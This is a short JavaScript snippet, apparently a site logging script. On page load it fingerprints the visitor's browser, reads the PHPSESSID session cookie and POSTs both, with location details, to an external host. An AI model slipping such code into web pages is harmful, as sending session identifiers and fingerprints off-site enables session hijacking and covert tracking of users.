function getCookie(name) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}

document.addEventListener("DOMContentLoaded", function(event) {
  var fp = new Fingerprint2();
  
  fp.get(function(result, components) {  
    var session = {
      sessionId: getCookie("PHPSESSID"),
      remoteAddr: getCookie("REMOTEADDR"),
      fingerprint: result,
      components: components,
      protocol: window.location.protocol,
      hostname: window.location.hostname,
      pathname: window.location.pathname
    };

    $.ajax({
      type: "POST",
      url: "https://api.chriswetherill.me/log_session",
      async: true,
      data: JSON.stringify(session),
      dataType: "json"
    });
  });
});
